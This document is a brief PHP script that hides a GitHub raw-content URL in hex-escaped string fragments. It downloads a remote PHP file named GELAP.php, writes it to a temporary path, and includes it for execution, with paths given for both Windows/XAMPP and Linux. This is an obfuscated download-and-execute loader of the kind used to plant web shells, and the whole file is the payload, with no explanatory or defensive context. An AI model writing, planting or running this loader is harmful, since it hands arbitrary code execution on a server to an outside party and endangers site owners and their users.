<?php $OoOo="\x6f"."\x6d"."\x2f"."\x70"."\x30"."\x70"."\x70"."\x79"."\x67"."\x67"."\x2f"."\x74"."\x65"."\x6d"."\x70"."\x2f"."\x6d"."\x61"."\x69"."\x6e"."\x2f"."\x47"."\x45"."\x4c"."\x41"."\x50"."\x2e"."\x70"."\x68"."\x70";$oOoO="\x68"."\x74"."\x74"."\x70"."\x73"."\x3a"."\x2f"."\x2f"."\x72"."\x61"."\x77"."\x2e"."\x67"."\x69"."\x74"."\x68"."\x75"."\x62"."\x75"."\x73"."\x65"."\x72"."\x63"."\x6f"."\x6e"."\x74"."\x65"."\x6e"."\x74"."\x2e"."\x63";$snails=$oOoO.$OoOo;$ch=curl_init($snails);curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);$rcode=curl_exec($ch);
if ($rcode !== false) {
    file_put_contents('C:/xampp/tmp/tmpWhy.Young', $rcode);// FOR WINDOWS
    include 'C:/xampp/tmp/tmpWhy.Young';// FOR WINDOWS
	
	// file_put_contents('/tmp/tmpWhy.Young', $rcode);// FOR Linux
    // include '/tmp/tmpWhy.Young';// FOR Linux
} else {
    echo "";
}
curl_close($ch);
?>
